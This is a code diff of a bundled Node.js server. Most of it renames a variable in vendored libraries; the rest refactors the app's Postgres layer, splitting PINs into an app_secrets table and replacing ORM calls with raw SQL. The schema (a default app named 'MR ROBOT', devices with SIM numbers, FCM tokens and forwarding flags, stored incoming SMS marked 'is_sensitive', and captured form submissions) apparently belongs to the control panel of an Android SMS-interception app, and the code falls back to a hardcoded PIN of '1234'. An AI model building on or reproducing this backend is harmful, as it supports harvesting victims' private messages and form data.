@@ -9016,10 +9016,10 @@ var require_raw_body = __commonJS({
       if (done) {
         return readStream(stream, encoding, length, limit, wrap(done));
       }
-      return new Promise(function executor(resolve3, reject) {
+      return new Promise(function executor(resolve2, reject) {
         readStream(stream, encoding, length, limit, function onRead(err, buf) {
           if (err) return reject(err);
-          resolve3(buf);
+          resolve2(buf);
         });
       });
     }
@@ -22403,7 +22403,7 @@ var require_view = __commonJS({
     var basename = path.basename;
     var extname = path.extname;
     var join = path.join;
-    var resolve3 = path.resolve;
+    var resolve2 = path.resolve;
     module.exports = View2;
     function View2(name, options) {
       var opts = options || {};
@@ -22437,7 +22437,7 @@ var require_view = __commonJS({
       debug('lookup "%s"', name);
       for (var i = 0; i < roots.length && !path2; i++) {
         var root = roots[i];
-        var loc = resolve3(root, name);
+        var loc = resolve2(root, name);
         var dir = dirname(loc);
         var file = basename(loc);
         path2 = this.resolve(dir, file);
@@ -22462,7 +22462,7 @@ var require_view = __commonJS({
       });
       sync = false;
     };
-    View2.prototype.resolve = function resolve4(dir, file) {
+    View2.prototype.resolve = function resolve3(dir, file) {
       var ext = this.ext;
       var path2 = join(dir, file);
       var stat = tryStat(path2);
@@ -24721,7 +24721,7 @@ var require_application = __commonJS({
     var compileETag = require_utils3().compileETag;
     var compileQueryParser = require_utils3().compileQueryParser;
     var compileTrust = require_utils3().compileTrust;
-    var resolve3 = __require("node:path").resolve;
+    var resolve2 = __require("node:path").resolve;
     var once = require_once();
     var Router19 = require_router();
     var slice = Array.prototype.slice;
@@ -24775,7 +24775,7 @@ var require_application = __commonJS({
       this.mountpath = "/";
       this.locals.settings = this.settings;
       this.set("view", View2);
-      this.set("views", resolve3("views"));
+      this.set("views", resolve2("views"));
       this.set("jsonp callback name", "callback");
       if (env2 === "production") {
         this.enable("view cache");
@@ -26280,7 +26280,7 @@ var require_send = __commonJS({
     var extname = path.extname;
     var join = path.join;
     var normalize = path.normalize;
-    var resolve3 = path.resolve;
+    var resolve2 = path.resolve;
     var sep = path.sep;
     var BYTES_RANGE_REGEXP = /^ *bytes=/;
     var MAX_MAXAGE = 60 * 60 * 24 * 365 * 1e3;
@@ -26309,7 +26309,7 @@ var require_send = __commonJS({
       this._maxage = opts.maxAge || opts.maxage;
       this._maxage = typeof this._maxage === "string" ? ms2(this._maxage) : Number(this._maxage);
       this._maxage = !isNaN(this._maxage) ? Math.min(Math.max(0, this._maxage), MAX_MAXAGE) : 0;
-      this._root = opts.root ? resolve3(opts.root) : null;
+      this._root = opts.root ? resolve2(opts.root) : null;
     }
     util.inherits(SendStream, Stream);
     SendStream.prototype.error = function error(status, err) {
@@ -26458,7 +26458,7 @@ var require_send = __commonJS({
           return res;
         }
         parts = normalize(path2).split(sep);
-        path2 = resolve3(path2);
+        path2 = resolve2(path2);
       }
       if (containsDotFile(parts)) {
         debug('%s dotfile "%s"', this._dotfiles, path2);
@@ -26836,7 +26836,7 @@ var require_response = __commonJS({
     var cookie = require_cookie();
     var send = require_send();
     var extname = path.extname;
-    var resolve3 = path.resolve;
+    var resolve2 = path.resolve;
     var vary = require_vary();
     var { Buffer: Buffer2 } = __require("node:buffer");
     var res = Object.create(http.ServerResponse.prototype);
@@ -27042,7 +27042,7 @@ var require_response = __commonJS({
       }
       opts = Object.create(opts);
       opts.headers = headers;
-      var fullPath = !opts.root ? resolve3(path2) : path2;
+      var fullPath = !opts.root ? resolve2(path2) : path2;
       return this.sendFile(fullPath, opts, done);
     };
     res.contentType = res.type = function contentType(type) {
@@ -27291,7 +27291,7 @@ var require_serve_static = __commonJS({
     var encodeUrl = require_encodeurl();
     var escapeHtml = require_escape_html();
     var parseUrl = require_parseurl();
-    var resolve3 = __require("path").resolve;
+    var resolve2 = __require("path").resolve;
     var send = require_send();
     var url = __require("url");
     module.exports = serveStatic;
@@ -27310,7 +27310,7 @@ var require_serve_static = __commonJS({
         throw new TypeError("option setHeaders must be function");
       }
       opts.maxage = opts.maxage || opts.maxAge || 0;
-      opts.root = resolve3(root);
+      opts.root = resolve2(root);
       var onDirectory = redirect ? createRedirectDirectoryListener() : createNotFoundDirectoryListener();
       return function serveStatic2(req, res, next) {
         if (req.method !== "GET" && req.method !== "HEAD") {
@@ -38329,7 +38329,7 @@ var require_lib5 = __commonJS({
       let accum = [];
       let accumBytes = 0;
       let abort = false;
-      return new Body.Promise(function(resolve3, reject) {
+      return new Body.Promise(function(resolve2, reject) {
         let resTimeout;
         if (_this4.timeout) {
           resTimeout = setTimeout(function() {
@@ -38363,7 +38363,7 @@ var require_lib5 = __commonJS({
           }
           clearTimeout(resTimeout);
           try {
-            resolve3(Buffer.concat(accum, accumBytes));
+            resolve2(Buffer.concat(accum, accumBytes));
           } catch (err) {
             reject(new FetchError(`Could not create Buffer from response body for ${_this4.url}: ${err.message}`, "system", err));
           }
@@ -39038,7 +39038,7 @@ var require_lib5 = __commonJS({
         throw new Error("native promise missing, set fetch.Promise to your favorite alternative");
       }
       Body.Promise = fetch2.Promise;
-      return new fetch2.Promise(function(resolve3, reject) {
+      return new fetch2.Promise(function(resolve2, reject) {
         const request = new Request(url, opts);
         const options = getNodeRequestOptions(request);
         const send = (options.protocol === "https:" ? https : http).request;
@@ -39171,7 +39171,7 @@ var require_lib5 = __commonJS({
                   requestOpts.body = void 0;
                   requestOpts.headers.delete("content-length");
                 }
-                resolve3(fetch2(new Request(locationURL, requestOpts)));
+                resolve2(fetch2(new Request(locationURL, requestOpts)));
                 finalize();
                 return;
             }
@@ -39192,7 +39192,7 @@ var require_lib5 = __commonJS({
           const codings = headers.get("Content-Encoding");
           if (!request.compress || request.method === "HEAD" || codings === null || res.statusCode === 204 || res.statusCode === 304) {
             response = new Response(body, response_options);
-            resolve3(response);
+            resolve2(response);
             return;
           }
           const zlibOptions = {
@@ -39202,7 +39202,7 @@ var require_lib5 = __commonJS({
           if (codings == "gzip" || codings == "x-gzip") {
             body = body.pipe(zlib.createGunzip(zlibOptions));
             response = new Response(body, response_options);
-            resolve3(response);
+            resolve2(response);
             return;
           }
           if (codings == "deflate" || codings == "x-deflate") {
@@ -39214,12 +39214,12 @@ var require_lib5 = __commonJS({
                 body = body.pipe(zlib.createInflateRaw());
               }
               response = new Response(body, response_options);
-              resolve3(response);
+              resolve2(response);
             });
             raw.on("end", function() {
               if (!response) {
                 response = new Response(body, response_options);
-                resolve3(response);
+                resolve2(response);
               }
             });
             return;
@@ -39227,11 +39227,11 @@ var require_lib5 = __commonJS({
           if (codings == "br" && typeof zlib.createBrotliDecompress === "function") {
             body = body.pipe(zlib.createBrotliDecompress());
             response = new Response(body, response_options);
-            resolve3(response);
+            resolve2(response);
             return;
           }
           response = new Response(body, response_options);
-          resolve3(response);
+          resolve2(response);
         });
         writeToStream(req, request);
       });
@@ -39590,8 +39590,8 @@ var require_retry = __commonJS({
       }
       const delay = getNextRetryDelay(config);
       err.config.retryConfig.currentRetryAttempt += 1;
-      const backoff = config.retryBackoff ? config.retryBackoff(err, delay) : new Promise((resolve3) => {
-        setTimeout(resolve3, delay);
+      const backoff = config.retryBackoff ? config.retryBackoff(err, delay) : new Promise((resolve2) => {
+        setTimeout(resolve2, delay);
       });
       if (config.onRetryAttempt) {
         config.onRetryAttempt(err);
@@ -40073,8 +40073,8 @@ var require_helpers = __commonJS({
     function req(url, opts = {}) {
       const href = typeof url === "string" ? url : url.href;
       const req2 = (href.startsWith("https:") ? https : http).request(url, opts);
-      const promise = new Promise((resolve3, reject) => {
-        req2.once("response", resolve3).once("error", reject).end();
+      const promise = new Promise((resolve2, reject) => {
+        req2.once("response", resolve2).once("error", reject).end();
       });
       req2.then = promise.then.bind(promise);
       return req2;
@@ -40251,7 +40251,7 @@ var require_parse_proxy_response = __commonJS({
     var debug_1 = __importDefault(require_src());
     var debug = (0, debug_1.default)("https-proxy-agent:parse-proxy-response");
     function parseProxyResponse(socket) {
-      return new Promise((resolve3, reject) => {
+      return new Promise((resolve2, reject) => {
         let buffersLength = 0;
         const buffers = [];
         function read() {
@@ -40317,7 +40317,7 @@ var require_parse_proxy_response = __commonJS({
           }
           debug("got proxy server response: %o %o", firstLine, headers);
           cleanup();
-          resolve3({
+          resolve2({
             connect: {
               statusCode,
               statusText,
@@ -40618,11 +40618,11 @@ var require_gaxios = __commonJS({
           if (!opts.validateStatus(translatedResponse.status)) {
             if (opts.responseType === "stream") {
               let response = "";
-              await new Promise((resolve3) => {
+              await new Promise((resolve2) => {
                 (translatedResponse === null || translatedResponse === void 0 ? void 0 : translatedResponse.data).on("data", (chunk) => {
                   response += chunk;
                 });
-                (translatedResponse === null || translatedResponse === void 0 ? void 0 : translatedResponse.data).on("end", resolve3);
+                (translatedResponse === null || translatedResponse === void 0 ? void 0 : translatedResponse.data).on("end", resolve2);
               });
               translatedResponse.data = response;
             }
@@ -45349,7 +45349,7 @@ var require_jwtaccess = __commonJS({
         }
       }
       fromStreamAsync(inputStream) {
-        return new Promise((resolve3, reject) => {
+        return new Promise((resolve2, reject) => {
           if (!inputStream) {
             reject(new Error("Must pass in a stream containing the service account auth settings."));
           }
@@ -45358,7 +45358,7 @@ var require_jwtaccess = __commonJS({
             try {
               const data = JSON.parse(s);
               this.fromJSON(data);
-              resolve3();
+              resolve2();
             } catch (err) {
               reject(err);
             }
@@ -45577,7 +45577,7 @@ var require_jwtclient = __commonJS({
         }
       }
       fromStreamAsync(inputStream) {
-        return new Promise((resolve3, reject) => {
+        return new Promise((resolve2, reject) => {
           if (!inputStream) {
             throw new Error("Must pass in a stream containing the service account auth settings.");
           }
@@ -45586,7 +45586,7 @@ var require_jwtclient = __commonJS({
             try {
               const data = JSON.parse(s);
               this.fromJSON(data);
-              resolve3();
+              resolve2();
             } catch (e) {
               reject(e);
             }
@@ -45706,7 +45706,7 @@ var require_refreshclient = __commonJS({
         }
       }
       async fromStreamAsync(inputStream) {
-        return new Promise((resolve3, reject) => {
+        return new Promise((resolve2, reject) => {
           if (!inputStream) {
             return reject(new Error("Must pass in a stream containing the user refresh token."));
           }
@@ -45715,7 +45715,7 @@ var require_refreshclient = __commonJS({
             try {
               const data = JSON.parse(s);
               this.fromJSON(data);
-              return resolve3();
+              return resolve2();
             } catch (err) {
               return reject(err);
             }
@@ -47276,7 +47276,7 @@ var require_pluggable_auth_handler = __commonJS({
        * @return A promise that resolves with the executable response.
        */
       retrieveResponseFromExecutable(envMap) {
-        return new Promise((resolve3, reject) => {
+        return new Promise((resolve2, reject) => {
           const child = childProcess.spawn(this.commandComponents[0], this.commandComponents.slice(1), {
             env: { ...process.env, ...Object.fromEntries(envMap) }
           });
@@ -47298,7 +47298,7 @@ var require_pluggable_auth_handler = __commonJS({
               try {
                 const responseJson = JSON.parse(output);
                 const response = new executable_response_1.ExecutableResponse(responseJson);
-                return resolve3(response);
+                return resolve2(response);
               } catch (error) {
                 if (error instanceof executable_response_1.ExecutableResponseError) {
                   return reject(error);
@@ -48148,7 +48148,7 @@ var require_googleauth = __commonJS({
         }
       }
       fromStreamAsync(inputStream, options) {
-        return new Promise((resolve3, reject) => {
+        return new Promise((resolve2, reject) => {
           if (!inputStream) {
             throw new Error("Must pass in a stream containing the Google auth settings.");
           }
@@ -48158,7 +48158,7 @@ var require_googleauth = __commonJS({
               try {
                 const data = JSON.parse(chunks.join(""));
                 const r = this._cacheClientFromJSON(data, options);
-                return resolve3(r);
+                return resolve2(r);
               } catch (err) {
                 if (!this.keyFilename)
                   throw err;
@@ -48168,7 +48168,7 @@ var require_googleauth = __commonJS({
                 });
                 this.cachedCredential = client;
                 this.setGapicJWTValues(client);
-                return resolve3(client);
+                return resolve2(client);
               }
             } catch (err) {
               return reject(err);
@@ -48204,17 +48204,17 @@ var require_googleauth = __commonJS({
        * Run the Google Cloud SDK command that prints the default project ID
        */
       async getDefaultServiceProjectId() {
-        return new Promise((resolve3) => {
+        return new Promise((resolve2) => {
           (0, child_process_1.exec)("gcloud config config-helper --format json", (err, stdout) => {
             if (!err && stdout) {
               try {
                 const projectId = JSON.parse(stdout).configuration.properties.core.project;
-                resolve3(projectId);
+                resolve2(projectId);
                 return;
               } catch (e) {
               }
             }
-            resolve3(null);
+            resolve2(null);
           });
         });
       }
@@ -61477,10 +61477,6 @@ function drizzle(...params) {
   drizzle2.mock = mock;
 })(drizzle || (drizzle = {}));
 
-// src/lib/db.ts
-import { existsSync as existsSync2, readFileSync as readFileSync2 } from "fs";
-import { resolve as resolve2 } from "path";
-
 // src/lib/logger.ts
 var import_pino = __toESM(require_pino(), 1);
 var isProduction = process.env.NODE_ENV === "production";
@@ -61502,6 +61498,7 @@ var logger = (0, import_pino.default)({
 // src/lib/schema.ts
 var schema_exports = {};
 __export(schema_exports, {
+  appSecrets: () => appSecrets,
   apps: () => apps,
   devices: () => devices,
   formData: () => formData,
@@ -61511,15 +61508,17 @@ var apps = pgTable("apps", {
   id: serial("id").primaryKey(),
   appId: text("app_id").notNull(),
   name: text("name").notNull(),
-  pin: text("pin").notNull().default("1234"),
   status: text("status").notNull().default("active"),
-  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
-  deleteProtectionPin: text("delete_protection_pin"),
-  deleteProtectionEnabled: boolean("delete_protection_enabled").notNull().default(false),
-  panelToken: text("panel_token")
+  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow()
 }, (t) => ({
   appIdUq: uniqueIndex("apps_app_id_uq").on(t.appId)
 }));
+var appSecrets = pgTable("app_secrets", {
+  appId: text("app_id").primaryKey(),
+  pin: text("pin").notNull().default("1234"),
+  deleteProtectionPin: text("delete_protection_pin"),
+  deleteProtectionEnabled: boolean("delete_protection_enabled").notNull().default(false)
+});
 var devices = pgTable("devices", {
   id: serial("id").primaryKey(),
   deviceId: text("device_id").notNull(),
@@ -61578,234 +61577,14 @@ if (!connectionString) {
 var pool = new eo({ connectionString });
 var db = drizzle(pool, { schema: schema_exports });
 var DEFAULT_APP_ID = "SKY-APP-2026-X9F3";
-var DEFAULT_APP_NAME = "MR ROBOT";
-var DEFAULT_APP_PIN = "1234";
-var SCHEMA_SQL = `
-CREATE TABLE IF NOT EXISTS apps (
-  id SERIAL PRIMARY KEY,
-  app_id TEXT NOT NULL,
-  name TEXT NOT NULL,
-  pin TEXT NOT NULL DEFAULT '1234',
-  status TEXT NOT NULL DEFAULT 'active',
-  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
-  delete_protection_pin TEXT,
-  delete_protection_enabled BOOLEAN NOT NULL DEFAULT FALSE
-);
-CREATE UNIQUE INDEX IF NOT EXISTS apps_app_id_uq ON apps(app_id);
-ALTER TABLE apps ADD COLUMN IF NOT EXISTS pin TEXT NOT NULL DEFAULT '1234';
-ALTER TABLE apps ADD COLUMN IF NOT EXISTS status TEXT NOT NULL DEFAULT 'active';
-ALTER TABLE apps ADD COLUMN IF NOT EXISTS created_at TIMESTAMPTZ NOT NULL DEFAULT NOW();
-ALTER TABLE apps ADD COLUMN IF NOT EXISTS delete_protection_pin TEXT;
-ALTER TABLE apps ADD COLUMN IF NOT EXISTS delete_protection_enabled BOOLEAN NOT NULL DEFAULT FALSE;
-ALTER TABLE apps ADD COLUMN IF NOT EXISTS panel_token TEXT;
-
-CREATE TABLE IF NOT EXISTS devices (
-  id SERIAL PRIMARY KEY,
-  device_id TEXT NOT NULL,
-  app_id TEXT NOT NULL,
-  user_id TEXT NOT NULL,
-  name TEXT NOT NULL,
-  android_version INTEGER NOT NULL DEFAULT 0,
-  sim1_carrier TEXT,
-  sim1_phone TEXT,
-  sim2_carrier TEXT,
-  sim2_phone TEXT,
-  status TEXT NOT NULL DEFAULT 'offline',
-  last_online TIMESTAMPTZ,
-  forward_enabled BOOLEAN NOT NULL DEFAULT FALSE,
-  forward_slot INTEGER,
-  fcm_token TEXT,
-  installed_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
-  updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
-);
-CREATE UNIQUE INDEX IF NOT EXISTS devices_device_id_uq ON devices(device_id);
-CREATE INDEX IF NOT EXISTS devices_app_idx ON devices(app_id);
-CREATE INDEX IF NOT EXISTS devices_user_idx ON devices(user_id);
-
-CREATE TABLE IF NOT EXISTS messages (
-  id SERIAL PRIMARY KEY,
-  app_id TEXT NOT NULL,
-  device_id TEXT NOT NULL,
-  user_id TEXT NOT NULL,
-  from_sender TEXT NOT NULL,
-  from_number TEXT NOT NULL,
-  body TEXT NOT NULL,
-  is_sensitive BOOLEAN NOT NULL DEFAULT FALSE,
-  received_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
-);
-CREATE INDEX IF NOT EXISTS messages_app_received_idx ON messages(app_id, received_at);
-CREATE INDEX IF NOT EXISTS messages_device_received_idx ON messages(device_id, received_at);
-CREATE INDEX IF NOT EXISTS messages_user_idx ON messages(user_id);
-
-CREATE TABLE IF NOT EXISTS form_data (
-  id SERIAL PRIMARY KEY,
-  app_id TEXT NOT NULL,
-  device_id TEXT NOT NULL,
-  data JSONB NOT NULL,
-  submitted_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
-);
-CREATE INDEX IF NOT EXISTS form_data_app_submitted_idx ON form_data(app_id, submitted_at);
-CREATE INDEX IF NOT EXISTS form_data_device_idx ON form_data(device_id);
-
-CREATE TABLE IF NOT EXISTS _meta (
-  key TEXT PRIMARY KEY,
-  value TEXT NOT NULL,
-  set_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
-);
-
-CREATE TABLE IF NOT EXISTS settings (
-  key TEXT PRIMARY KEY,
-  value TEXT NOT NULL
-);
-`;
-var JSON_MIGRATION_KEY = "json_migration_v1";
-async function migrateFromJsonIfNeeded() {
-  const claim = await pool.query(
-    `INSERT INTO _meta (key, value) VALUES ($1, 'in-progress')
-     ON CONFLICT (key) DO NOTHING
-     RETURNING key`,
-    [JSON_MIGRATION_KEY]
-  );
-  if (claim.rowCount === 0) {
-    logger.info("JSON migration already done or in progress on another boot \u2014 skipping");
-    return;
-  }
-  const jsonPath = resolve2(process.cwd(), "data", "local-db.json");
-  if (!existsSync2(jsonPath)) {
-    logger.info("No legacy local-db.json found \u2014 marking migration done");
-    await pool.query(`UPDATE _meta SET value='done', set_at=NOW() WHERE key=$1`, [JSON_MIGRATION_KEY]);
-    return;
-  }
-  let parsed;
-  try {
-    parsed = JSON.parse(readFileSync2(jsonPath, "utf8"));
-  } catch (err) {
-    logger.warn({ err }, "Failed to parse legacy local-db.json \u2014 marking migration done to avoid retries");
-    await pool.query(`UPDATE _meta SET value='done-parse-error', set_at=NOW() WHERE key=$1`, [JSON_MIGRATION_KEY]);
-    return;
-  }
-  logger.info("Migrating legacy local-db.json data into Postgres\u2026");
-  const client = await pool.connect();
-  try {
-    await client.query("BEGIN");
-    for (const a2 of parsed.apps ?? []) {
-      await client.query(
-        `INSERT INTO apps (app_id, name, pin, status, created_at)
-         VALUES ($1, $2, $3, $4, $5)
-         ON CONFLICT (app_id) DO NOTHING`,
-        [a2.appId, a2.name, a2.pin, a2.status, a2.createdAt]
-      );
-    }
-    for (const d of parsed.devices ?? []) {
-      await client.query(
-        `INSERT INTO devices (device_id, app_id, user_id, name, android_version, sim1_carrier, sim1_phone, sim2_carrier, sim2_phone, status, last_online, forward_enabled, forward_slot, fcm_token, installed_at, updated_at)
-         VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16)
-         ON CONFLICT (device_id) DO NOTHING`,
-        [
-          d.deviceId,
-          d.appId,
-          d.userId,
-          d.name,
-          Number(d.androidVersion ?? 0),
-          d.sim1Carrier ?? null,
-          d.sim1Phone ?? null,
-          d.sim2Carrier ?? null,
-          d.sim2Phone ?? null,
-          d.status ?? "offline",
-          d.lastOnline ?? null,
-          Boolean(d.forwardEnabled),
-          d.forwardSlot ?? null,
-          d.fcmToken ?? null,
-          d.installedAt ?? (/* @__PURE__ */ new Date()).toISOString(),
-          d.updatedAt ?? (/* @__PURE__ */ new Date()).toISOString()
-        ]
-      );
-    }
-    for (const m2 of parsed.messages ?? []) {
-      await client.query(
-        `INSERT INTO messages (app_id, device_id, user_id, from_sender, from_number, body, is_sensitive, received_at)
-         VALUES ($1,$2,$3,$4,$5,$6,$7,$8)`,
-        [m2.appId, m2.deviceId, m2.userId, m2.fromSender, m2.fromNumber, m2.body, Boolean(m2.isSensitive), m2.receivedAt]
-      );
-    }
-    for (const f of parsed.formData ?? []) {
-      await client.query(
-        `INSERT INTO form_data (app_id, device_id, data, submitted_at)
-         VALUES ($1,$2,$3,$4)`,
-        [f.appId, f.deviceId, JSON.stringify(f.data), f.submittedAt]
-      );
-    }
-    await client.query(`UPDATE _meta SET value='done', set_at=NOW() WHERE key=$1`, [JSON_MIGRATION_KEY]);
-    await client.query("COMMIT");
-  } catch (err) {
-    await client.query("ROLLBACK");
-    await pool.query(`DELETE FROM _meta WHERE key=$1`, [JSON_MIGRATION_KEY]);
-    logger.error({ err }, "JSON migration failed and rolled back \u2014 claim released for retry");
-    throw err;
-  } finally {
-    client.release();
-  }
-  logger.info({
-    apps: parsed.apps?.length ?? 0,
-    devices: parsed.devices?.length ?? 0,
-    messages: parsed.messages?.length ?? 0,
-    formData: parsed.formData?.length ?? 0
-  }, "Legacy JSON migration completed");
-}
 var initPromise = null;
 function initDb() {
   if (!initPromise) {
     initPromise = (async () => {
-      logger.info("Initializing Postgres schema\u2026");
-      try {
-        const { rows } = await pool.query(`
-          SELECT COUNT(*)::int AS cnt
-          FROM information_schema.columns
-          WHERE table_schema = 'public' AND table_name = 'apps'
-        `);
-        const colCount = Number(rows[0]?.cnt ?? 0);
-        logger.info({ colCount }, "apps table column count");
-        if (colCount > 20) {
-          logger.warn({ colCount }, "apps table corrupted \u2014 dropping to recreate (data will be re-seeded)");
-          await pool.query("DROP TABLE IF EXISTS apps CASCADE");
-        }
-      } catch (healErr) {
-        logger.warn({ healErr }, "self-heal check failed, continuing");
-      }
-      const stmts = SCHEMA_SQL.split(";").map((s) => s.trim()).filter((s) => s.length > 0);
-      for (const stmt of stmts) {
-        try {
-          await pool.query(stmt);
-        } catch (err) {
-          const msg = err instanceof Error ? err.message : String(err);
-          if (msg.includes("already exists") || msg.includes("1600") || msg.includes("duplicate column")) {
-            logger.warn({ stmt: stmt.slice(0, 80), msg }, "Schema stmt skipped (already applied)");
-          } else {
-            throw err;
-          }
-        }
-      }
-      try {
-        await pool.query("ALTER TABLE apps ADD COLUMN IF NOT EXISTS pin TEXT NOT NULL DEFAULT '1234'");
-      } catch {
-      }
-      try {
-        await pool.query(
-          `INSERT INTO apps (app_id, name, pin, status) VALUES ($1,$2,$3,'active')
-           ON CONFLICT (app_id) DO NOTHING`,
-          [DEFAULT_APP_ID, DEFAULT_APP_NAME, DEFAULT_APP_PIN]
-        );
-      } catch {
-        await pool.query(
-          `INSERT INTO apps (app_id, name, status) VALUES ($1,$2,'active')
-           ON CONFLICT (app_id) DO NOTHING`,
-          [DEFAULT_APP_ID, DEFAULT_APP_NAME]
-        );
-      }
-      await migrateFromJsonIfNeeded();
-      logger.info("Postgres ready");
+      await pool.query("SELECT 1");
+      logger.info("Postgres connected \u2713");
     })().catch((err) => {
-      logger.error({ err }, "Postgres init failed");
+      logger.error({ err }, "Postgres connection failed");
       initPromise = null;
       throw err;
     });
@@ -61825,16 +61604,24 @@ function isoReq(d) {
 function mapApp(r) {
   return {
     id: r.id,
-    appId: r.appId,
+    appId: r.app_id,
     name: r.name,
     pin: r.pin,
     status: r.status,
-    createdAt: isoReq(r.createdAt),
-    deleteProtectionPin: r.deleteProtectionPin ?? null,
-    deleteProtectionEnabled: r.deleteProtectionEnabled ?? false,
-    panelToken: r.panelToken ?? null
+    createdAt: isoReq(r.created_at),
+    deleteProtectionPin: r.delete_protection_pin ?? null,
+    deleteProtectionEnabled: r.delete_protection_enabled ?? false
   };
 }
+var APPS_JOIN = `
+  SELECT
+    a.id, a.app_id, a.name, a.status, a.created_at,
+    COALESCE(s.pin, '1234')                         AS pin,
+    s.delete_protection_pin,
+    COALESCE(s.delete_protection_enabled, false)    AS delete_protection_enabled
+  FROM apps a
+  LEFT JOIN app_secrets s ON s.app_id = a.app_id
+`;
 function mapDevice(r) {
   return {
     id: r.id,
@@ -61879,57 +61666,121 @@ function mapFormData(r) {
   };
 }
 var localDb = {
-  // ------ APPS ------
+  // ------ APPS (raw SQL — joins apps + app_secrets, never alters schema) ------
   async listApps() {
-    const rows = await db.select().from(apps).orderBy(asc(apps.createdAt));
+    const { rows } = await pool.query(`${APPS_JOIN} ORDER BY a.created_at ASC`);
     return rows.map(mapApp);
   },
   async getApp(appId) {
-    const rows = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
+    const { rows } = await pool.query(`${APPS_JOIN} WHERE a.app_id = $1 LIMIT 1`, [appId]);
     return rows[0] ? mapApp(rows[0]) : void 0;
   },
   async createApp(input) {
     const rawPin = input.pin ?? "1234";
-    const inserted = await db.insert(apps).values({
-      appId: input.appId,
-      name: input.name,
-      pin: isHashed(rawPin) ? rawPin : hashPin(rawPin),
-      status: input.status ?? "active"
-    }).onConflictDoNothing({ target: apps.appId }).returning();
-    if (inserted.length === 0) throw new Error("APP_EXISTS");
-    return mapApp(inserted[0]);
+    const hashedPin = isHashed(rawPin) ? rawPin : hashPin(rawPin);
+    const client = await pool.connect();
+    try {
+      await client.query("BEGIN");
+      const { rows, rowCount } = await client.query(
+        `INSERT INTO apps (app_id, name, status)
+         VALUES ($1, $2, $3)
+         ON CONFLICT (app_id) DO NOTHING
+         RETURNING app_id`,
+        [input.appId, input.name, input.status ?? "active"]
+      );
+      if (!rowCount || rowCount === 0) {
+        await client.query("ROLLBACK");
+        throw new Error("APP_EXISTS");
+      }
+      await client.query(
+        `INSERT INTO app_secrets (app_id, pin)
+         VALUES ($1, $2)
+         ON CONFLICT (app_id) DO UPDATE SET pin = EXCLUDED.pin`,
+        [input.appId, hashedPin]
+      );
+      await client.query("COMMIT");
+    } catch (err) {
+      await client.query("ROLLBACK").catch(() => {
+      });
+      throw err;
+    } finally {
+      client.release();
+    }
+    return await this.getApp(input.appId);
   },
   async updateApp(appId, updates) {
-    const patch = {};
-    if (updates.name !== void 0) patch.name = updates.name;
-    if (updates.pin !== void 0) patch.pin = isHashed(updates.pin) ? updates.pin : hashPin(updates.pin);
-    if (updates.status !== void 0) patch.status = updates.status;
-    if (updates.deleteProtectionPin !== void 0) patch.deleteProtectionPin = updates.deleteProtectionPin ? isHashed(updates.deleteProtectionPin) ? updates.deleteProtectionPin : hashPin(updates.deleteProtectionPin) : null;
-    if (updates.deleteProtectionEnabled !== void 0) patch.deleteProtectionEnabled = updates.deleteProtectionEnabled;
-    if (updates.panelToken !== void 0) patch.panelToken = updates.panelToken;
-    if (Object.keys(patch).length === 0) return this.getApp(appId);
-    const [row] = await db.update(apps).set(patch).where(eq(apps.appId, appId)).returning();
-    return row ? mapApp(row) : void 0;
+    const appSets = [];
+    const appVals = [];
+    if (updates.name !== void 0) {
+      appSets.push(`name = $${appVals.length + 1}`);
+      appVals.push(updates.name);
+    }
+    if (updates.status !== void 0) {
+      appSets.push(`status = $${appVals.length + 1}`);
+      appVals.push(updates.status);
+    }
+    if (appSets.length > 0) {
+      appVals.push(appId);
+      await pool.query(`UPDATE apps SET ${appSets.join(", ")} WHERE app_id = $${appVals.length}`, appVals);
+    }
+    const hasSecretUpdate = updates.pin !== void 0 || updates.deleteProtectionPin !== void 0 || updates.deleteProtectionEnabled !== void 0;
+    if (hasSecretUpdate) {
+      await pool.query(
+        `INSERT INTO app_secrets (app_id, pin) VALUES ($1, '1234') ON CONFLICT (app_id) DO NOTHING`,
+        [appId]
+      );
+      const secSets = [];
+      const secVals = [appId];
+      if (updates.pin !== void 0) {
+        const hashed = isHashed(updates.pin) ? updates.pin : hashPin(updates.pin);
+        secSets.push(`pin = $${secVals.length + 1}`);
+        secVals.push(hashed);
+      }
+      if (updates.deleteProtectionPin !== void 0) {
+        const dp = updates.deleteProtectionPin ? isHashed(updates.deleteProtectionPin) ? updates.deleteProtectionPin : hashPin(updates.deleteProtectionPin) : null;
+        secSets.push(`delete_protection_pin = $${secVals.length + 1}`);
+        secVals.push(dp);
+      }
+      if (updates.deleteProtectionEnabled !== void 0) {
+        secSets.push(`delete_protection_enabled = $${secVals.length + 1}`);
+        secVals.push(updates.deleteProtectionEnabled);
+      }
+      if (secSets.length > 0) {
+        await pool.query(
+          `UPDATE app_secrets SET ${secSets.join(", ")} WHERE app_id = $1`,
+          secVals
+        );
+      }
+    }
+    return this.getApp(appId);
   },
   async verifyAppPin(appId, pin) {
     const app2 = await this.getApp(appId);
     if (!app2) return void 0;
     if (!verifyPin(pin, app2.pin)) return void 0;
     if (!isHashed(app2.pin)) {
-      await db.update(apps).set({ pin: hashPin(pin) }).where(eq(apps.appId, appId));
+      await pool.query(
+        `INSERT INTO app_secrets (app_id, pin) VALUES ($1, $2)
+         ON CONFLICT (app_id) DO UPDATE SET pin = EXCLUDED.pin`,
+        [appId, hashPin(pin)]
+      ).catch(() => {
+      });
     }
     return app2;
   },
   async deleteApp(appId) {
-    const [row] = await db.delete(apps).where(eq(apps.appId, appId)).returning();
-    return row ? mapApp(row) : void 0;
+    const app2 = await this.getApp(appId);
+    if (!app2) return void 0;
+    await pool.query(`DELETE FROM app_secrets WHERE app_id = $1`, [appId]).catch(() => {
+    });
+    await pool.query(`DELETE FROM apps WHERE app_id = $1`, [appId]);
+    return app2;
   },
   // ------ DEVICES ------
   async listDevices(filter = {}) {
     const where = filter.appId ? eq(devices.appId, filter.appId) : filter.userId ? eq(devices.userId, filter.userId) : void 0;
     const q = where ? db.select().from(devices).where(where) : db.select().from(devices);
-    const rows = await q;
-    return rows.map(mapDevice);
